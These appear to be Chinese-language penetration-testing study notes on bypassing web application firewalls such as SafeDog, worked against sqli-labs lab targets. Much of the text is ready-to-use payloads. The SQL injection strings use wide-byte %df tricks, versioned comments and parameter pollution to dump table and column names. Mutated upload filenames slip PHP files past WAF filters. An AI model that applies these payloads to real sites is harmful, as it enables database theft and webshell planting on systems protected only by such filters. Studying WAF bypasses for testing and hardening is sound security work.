【WAF绕过-安全狗】

阿里云、云盾、安全狗、宝塔等等

深信服、绿盟、启明星辰、奇安信等等

方式

1、GET方式

2、POST方式

3、http头部-爬虫白名单

  • 【干扰字符】

1、大小写（sqli-labs27）进行字母大小写绕过

id=1‘and(updatexml(1,concat(0x7e,(SELEct(group_concat(table_name))from(information_schema.tables)where(table_schema=%27security%27))),1))or%27

2、双写绕过（sqli-labs25）监测到关键字进行删除

aandnd 1=1 --+

3、编码(sqli-35)

url、md5，base64等几种常见的编码方式

？id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273–+

4、宽字节

  • [ ] Less-33:

关闭系统的魔术引号，数据库执行以下语句，改变查询客户端的编码:

show VARIABLES LIKE "%char%"set character_set_client=gbk

  • [ ] test-payload:

?id=1’ //Hint: The Query String you input is escaped as : \’

?id=%df’ //Hint: The Query String you input is escaped as : \'，利用宽字节吃掉后面的 \ 转移符号。

  • [ ] payload:

?id=%df’ union select 1,2,3 --+

?id=%df’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

?id=%df’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273 --+

以上的绕过方法：

1.编码绕过（数字型可以绕过，字符型不行）

2.宽字节绕过（前提数据库的编码是 gbk）

在计算机中每一个字符为8位，那么就是1个字节，所谓的宽字节注入就是两个字节合并从而进行绕过，例如，韩文，日文，繁体字 都属于宽字节类型，http://127.0.0.1/where.php?id=1’ 当我们输入单引号的时候，那么会被转义成\'，这样就无法进行注入但是进行绕过的话，在ID参数加入一个%df 被转义后成为 %df%5c 那么就会成为一个繁体字。

5、等价函数

由于检测到关键字，因此无法使用某些函数或命令，但在很多情况下，我们可以使用它们的等效或类似代码替换mid、ascii、eval等几种常见的敏感函数，来执行同样的效果，用其他函数来取代敏感函数

union all select=union select and=&&或者用or =可用><

6、特殊符号

绕过正则表达式的匹配

+、`、~、!、@、%、()、[]、.、-、+ 、|、%00、%23、%0a等等

union select组合在一起才拦截

7、注释符混用 /**/

类似跟特殊符号的作用

select database() = select database/**/()

8、版本号绕过

如果在/*后加惊叹号!意为/* /里的语句将被执行，在mysql中 /! …/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在/!..*/中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行

/!xxxx/当版本高于xxxx时候执行里面内容

9、参数污染

id=1 /*&id=1 xxxxxx --+ */

#payload

http://192.168.80.140/sqlilabs/Less-2/?id=-1 union all%23%0Aselect 1,2,3#

http://192.168.80.140/sqlilabs/Less-2/?id=-1 union**/%00/%23a%0A**select 1,2,3#

http://192.168.80.140/sqlilabs/Less-2/?id=-1 union**/%00/%23a%0A/!select 1,database%23x%0A(),3/**#

http://192.168.80.140/sqlilabs/Less-2/?id=1/&id=-1**%20union%20select%201,2,3%23/**

参数污染：安全狗进行检测得时候，会以为后面得已经被注释了，所以不会去检测，然后由于参数污染，实际上接受得是后面得那部分&后面的语句

http://192.168.80.140/sqlilabs/Less-2/?id=-1 union /!44509select/ 1,2,3#

http://192.168.80.140/sqlilabs/Less-2/?id=-1 union**/%00//!44509select/** 1,database**%23x%0A**(),3#

如果在/*后加惊叹号!意为/* /里的语句将被执行，在mysql中 /! …/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在/!..*/中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行

参考链接：http://www.360doc.cn/mip/960801574.html?ivk_sa=1024320u

【fuzz结合大法】

Fuzz测试，也叫做“模糊测试”，是一种挖掘软件安全漏洞、检测软件健壮性的黑盒测试，它通过向软件输入非法的字段，观测被测试软件是否异常而实现。

http://192.168.80.140/sqlilabs/Less-2/?id=-1[位置一]union[位置二]select[位置三]1,database[位置四](),3#

【文件上传绕过演示】

#大多WAF 匹配原则

1. 看见上传.php文件名马上拦截

2. 看见上传php.php文件名限制左边或者右边

#上传参数

  • [ ] Content-Disposition–用于接受表单数据,一般可以任意修改，甚至删除
  • [ ] name–接受到的表单名,不可修改
  • [ ] filename–上传文件名,可以修改
  • [ ] Content-Type–MIME类型,视情况定，需要考虑网站上传验证是否处理

#payload：

①%00加url编码绕过

原理：利用截断加编码让waf匹配不到php后缀并且我们自己可以解析为php文件

filename=“x.php[%00].jpg”

②单双引号变异绕过：

原理：编程语言中变量后面一般都有双引号，有时候waf没有考虑到去掉引号而存在绕过

filename="2’.php

filename="'2.php

filename="1’2.php

③双文件名绕过：

原理：开发waf的作者只考虑到了单个变量提交，而没考虑到我们复制一个filename，产生了循环，也就只匹配了第一个

filename= ;filename=“1.php”

④换行绕过：

原理：数据包的换行默认是\n，但是waf在检测的时候检测到的是x\n.\np\nh\np

filename=“x.php”

⑤参数溢出绕过

原理：waf检测的范围有限，没有考虑参数溢出的情况

Content-Disposition: form-data;[垃圾数据]; name=“file”;[垃圾数据];filename=“x.php”

⑥重复参数绕过

filename==“1.php”

filename===“1.php”

⑦数据截止绕过

filename=“1;.php”

⑧fuzz绕过
